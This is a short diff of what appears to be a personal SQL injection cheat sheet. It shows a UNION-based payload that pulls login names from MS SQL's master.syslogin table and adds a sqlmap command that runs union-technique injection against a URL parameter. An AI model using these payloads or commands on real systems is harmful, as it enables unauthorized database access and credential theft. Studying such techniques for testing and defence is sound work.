@@ -55,4 +55,7 @@ Automate the process of SQL blind
 
 - 9999' UNION SELECT name,222,'else1' FROM master.syslogin; --
 
-### 
+
+### SQLmap:
+
+- sqlmap  &nbsp; -u URL  &nbsp; -p search  &nbsp; --technique=U |  &nbsp; U for Union Selection
